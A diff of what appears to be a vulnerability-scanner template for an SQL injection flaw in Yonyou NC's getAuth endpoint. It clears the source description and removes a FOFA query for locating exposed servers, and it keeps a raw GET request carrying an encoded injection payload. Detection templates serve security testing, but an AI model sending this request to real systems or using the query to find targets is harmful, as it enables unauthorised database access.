@@ -3,12 +3,8 @@ info:
   name: 用友NC存在 getAuth 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kh5ykw03rqarczw3'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kh5ykw03rqarczw3
-    fofa: body="logo/images/ufida.ico" || (body="UFIDA" && body="logo/images/") || (body="logo/images/ufida_nc.png") || body="<div id=\"nc_text\">" || body="<div id=\"nc_img\" onmouseover=\"overImage('nc');" ||
 http:
 - raw:
   - 'GET /portal/pt/oncelogin/getAuth?param=eonAPxvysh7FObnSAr5BW%2bb9alMGTWUUZ4JMw/52GpGldc7JeEDrbSr4pB7olnl7S5B%2bTU0CzqLRvjy5lFIP31T16ZKPbccnP3tbO7hvhTwlA32kzkl7mp4wdgWYRRHZAN1WrGTnH7T6piWMNgu9qHyegbf%2biaf8TE%2b968%2by5Zs%3d HTTP/1.1
